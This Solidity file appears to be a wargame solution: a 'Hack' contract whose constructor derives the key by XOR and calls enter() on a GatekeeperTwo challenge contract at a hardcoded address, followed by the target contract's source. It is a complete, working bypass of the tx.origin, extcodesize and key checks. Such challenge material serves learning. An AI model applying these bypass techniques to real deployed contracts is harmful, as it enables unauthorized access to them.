// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;
import {GatekeeperTwo} from "./GatekeeperTwo.sol";
contract Hack {
    function Hack() public {
        GatekeeperTwo gate = GatekeeperTwo(0x1e600DeB41a8ccCcb657C8cC0f3cf01d4b2FC160);
        bytes8 key = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1));
        gate.call(bytes4(keccak256('enter(bytes8)')), key);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.24;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}